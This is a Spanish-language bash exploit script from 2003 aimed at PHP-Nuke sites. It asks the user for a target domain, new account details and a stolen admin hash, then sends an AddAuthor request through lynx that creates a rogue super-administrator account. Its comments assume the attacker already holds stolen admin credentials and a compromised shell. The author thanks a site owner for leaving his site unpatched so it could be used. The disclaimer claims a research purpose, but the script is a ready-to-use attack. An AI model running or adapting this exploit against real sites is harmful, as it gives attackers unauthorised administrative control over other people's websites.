#!/bin/bash

# IMPORTANTE!: Si tu usas (o tu shell) FreeBSD y no encuentra la
# bash, te recuerdo que esta en: /usr/compat/linux/bin/bash

# -------------------------------#
##################################
#       YAX-ploit PHPNuke        #
# por flux <flux@ananzi.co.uk>   #
# t-servers.net/flux             #      
##################################
# -------------------------------#

# @ Delirio = On
# ----------------------------------------------------------------
# Realmente, realmente, no es gran cosa, estoy seguro que no =)))
# Lo que ciertamente me orillo a hacer algo de este 'magnitud', fue
# que por ahi vi en una web un 'programa' (totalmente GUI) con la
# finalidad de 'explotar' este bug (.exe), entonces dije, hagamos 
# que se sientan mas fux0rs y sugiramos usar una shell.
# ----------------------------------------------------------------
# @ Delirio = Off 

# [!!!] Declinacion de responsabilidades
# ----------------------------------------------------------------
# Ya saben que va aqui, no?. Bueno, pues solo para decirles de
# viva tecla que TENGAN CUIDADO y que no anden de portal en portal
# haciendo cosas que no deben. Esto lo hice por 2 cosas, aunque
# suene muy gastado, que son: 1. Investigacion, simplemente inves-
# tigacion y 2. Para que PHP Nuke sea mas seguro cada dia. (no soy
# fan de ese sistema, pero si de la seguridad, y eso engloba todo)
# ----------------------------------------------------------------

# [%]  Instrucciones
# 
# Despues de haber conseguido el login del administrador y tambien
# el hash solo te queda subir este yax-phpnuke.sh a tu shell, je,
# supongo que cuentas con una por que no querras lanzarlo desde tu
# propia /bin/bash. NOTA: www.cyberspace.org, contiene todo lo que
# necesitas. Es decir, bash y lynx, =).
#
# Recuerda que debes darle permisos a yax-phpnuke.sh, con solo
# teclear: $ chmod +x yax-phpnuke.sh y luego $ ./yax-phpnuke.sh
#
# El script te llevara de la mano... Proporcionale la info que te
# pide y todo saldra "bien" =).

# [!] Info sobre la falla y tambien solucion: 
# - http://www.cyruxnet.com.ar/phpnuke_modules.htm
# - http://www.security.nnov.ru/search/document.asp?docid=5201
# - http://phpnuke.org

# ----------------------------------------------------------------
# Gracias a Nelson por no parchear su sitio y dejarme hacer cosas
# ahi. 
# ----------------------------------------------------------------

function publi
{
echo "";
echo -e '\033[01;31m-[ YAX-ploit PHP Nuke ]-\033[0m';
echo -e '\033[1;46;37mBy flux <flux@ananzi.co.za>\033[0m';
echo "http://t-servers.net/flux";
echo "";
echo "Para mas informacion: $ less yax-phpnuke.sh";
echo "";
echo "[i] Teclea los datos que se te pide.";
echo "";
}

function rdatos
{
echo -n "[?] Teclea el nombre del sitio vulnerable (sin http://): "; read nukedominio
echo -n "[?] Teclea tu nombre (inventalo si quieres =P): "; read nombreh
echo -n "[?] Teclea tu nick (login): "; read nickh
echo -n "[?] Teclea tu direccion e-mail: "; read emailh
echo -n "[?] Teclea un password para tu usuario: "; read passh
echo -n "[?] Copia y pega (o que alguien te lo dicte, =P) el hash: "; read hash
}

function xnuke
{

echo -e '\033[31m[*] Lanzado exploit!...\033[0m'

lynx "http://$nukedominio/admin.php?op=AddAuthor&add_radminsuper=1&add_name=$nombreh&add_aid=$nickh&add_email=$emailh&add_pwd=$passh&admin=$hash"

}

function verifica
{
echo "";
echo "[!] Verifica los datos que seran enviados y recuerdalos:";
echo "--------------------------------------------------------";
echo "[v] Nombre: $nombreh | E-Mail: $emailh";
echo "    Login: $nickh Password: $passh";
echo "    Hash: $hash";
echo "";
echo "    Enviado a: $nukedominio";
echo "--------------------------------------------------------";
echo "";
echo -n "Todo es correcto? (teclea si, no o salir): "; read con 
}

function val
{
case $con in

si)

xnuke

;;

no)

echo "";
echo "Vuelve a teclear todos los datos: ";
echo "";

rdatos
verifica
val
;;

salir)

echo "Saliendo...";
echo -e '\033[01;31m-[ YAX-ploit PHP Nuke ]-\033[0m';
echo -e '\033[1;46;37mBy flux <flux@ananzi.co.za>\033[0m';
echo "Gracias!";

;;

*)

echo -n "Por favor, teclea solo si, no o salir: "; read con

val


;;
esac
}

publi

rdatos

verifica

val

# 19-oct-2003
